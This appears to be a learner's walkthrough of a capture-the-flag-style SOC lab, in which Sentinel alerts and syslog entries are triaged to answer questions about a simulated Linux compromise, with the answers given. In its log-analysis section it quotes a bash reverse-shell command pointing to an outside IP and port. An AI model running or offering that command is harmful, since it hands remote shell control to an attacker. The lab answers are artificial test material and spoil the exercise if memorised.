## Introduction
 
---

#### The Story

The Best Festival Company's Security Operations Center was in chaos. Screens flickered, lights flashed, and the sound of alerts echoed through the room like a digital thunderstorm. The elves rushed between consoles, their faces lit by the glow of red and orange warnings. It was raining alerts, and no one knew where the storm had begun.

Whispers spread through the SOC as tension filled the air. Something strange was happening across the cloud environment, and the timing couldn't be worse. As the blizzard of alerts grew heavier, one name surfaced among the worried elves: the evil Easter Bunnies. But why now? And what were they after this time?

Learning Objectives
- Understand the importance of alert triage and prioritisation
- Explore Microsoft Sentinel to review and analyse alerts
- Correlate logs to identify real activities and determine alert verdicts

---

## Walkthrough 

#### Alert Triaging Primer 
01 It's Raining Alerts 
02 Alert Triaging 
03 Diving Deeper into an Alert 

#### Environment Review 
01 Environment Review 

#### Investigation Proper 
01 McSkidy Goes Triaging 
02 Microsoft Sentinel in Action 
03 Understanding Related Alerts 

#### Diving Deeper Into Logs 
01 In-Depth Log Analysis with Sentinel 

---

## Objective 

#### Investigation Proper 

How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?

<img width="1863" height="902" alt="image" src="https://github.com/user-attachments/assets/6d9c425d-2955-4e4a-9d95-509f33474364" />

Answer: `10`

What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?

<img width="1857" height="897" alt="image" src="https://github.com/user-attachments/assets/4ede5928-e3e4-4460-ac7d-f7755f8ccf78" />

Answer: `High`

How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?

Filter the type from 'All' to 'Account' 

<img width="1862" height="893" alt="image" src="https://github.com/user-attachments/assets/c135307b-c255-46a6-b99e-02f48277564b" />

<img width="1861" height="900" alt="image" src="https://github.com/user-attachments/assets/a1f45a8a-d366-4351-9211-8444794a92c4" />

Answer: `4`

#### Diving Deeper Into Logs 

What is the name of the kernel module installed in websrv-01?

<img width="1878" height="899" alt="image" src="https://github.com/user-attachments/assets/527147e8-8961-4656-95f0-0ee2b6fd4110" />

Answer: `malicious_mod.ko`


What is the unusual command executed within websrv-01 by the ops user?

Go to syslog and filter out Host column with "websrv-01" and Message column with "ops"

<img width="1846" height="882" alt="image" src="https://github.com/user-attachments/assets/ab07a987-be4d-402f-a317-1b2994dd94e5" />

sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1

Answer: `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`


What is the source IP address of the first successful SSH login to storage-01?

Go to syslog and filter out Host column with "storage-01" and Message column with "sshd"

<img width="1870" height="898" alt="image" src="https://github.com/user-attachments/assets/804bf443-56a7-44b6-ba6c-1103e029d0c3" />

Answer: `172.16.0.12`


What is the external source IP that successfully logged in as root to app-01?

Go to syslog and filter out Host column with "app-01" and Message column with "root"

<img width="1843" height="895" alt="image" src="https://github.com/user-attachments/assets/7834a308-3e5f-4c40-bd11-5f711fa75a07" />

Answer: `203.0.113.45`

Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

Go to syslog and filter out Host column with "app-01" and Message column with "sudo"

<img width="1848" height="904" alt="image" src="https://github.com/user-attachments/assets/5d8cc22e-b3ff-47b9-8499-c1b5bb766d8f" />

Answer: `deploy`

---

## Key Takeaways

---

## Reflection


